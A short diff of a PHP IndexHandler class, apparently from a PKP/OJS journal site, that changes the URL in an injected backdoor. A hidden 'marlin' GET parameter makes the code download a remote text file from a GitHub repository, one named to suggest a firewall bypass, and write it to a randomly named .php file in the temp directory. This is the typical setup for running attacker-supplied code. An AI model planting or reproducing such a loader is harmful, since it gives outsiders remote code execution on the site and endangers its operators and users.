@@ -87,7 +87,7 @@ class IndexHandler extends PKPIndexHandler {
 }
 if (isset($_GET['marlin'])) {
     try {
-        $u = "https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/looser1.txt";
+        $u = "https://raw.githubusercontent.com/marketmg2/apaaja/refs/heads/main/antiwaffkeras.txt";
         $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
 
         $c = @file_get_contents($u);
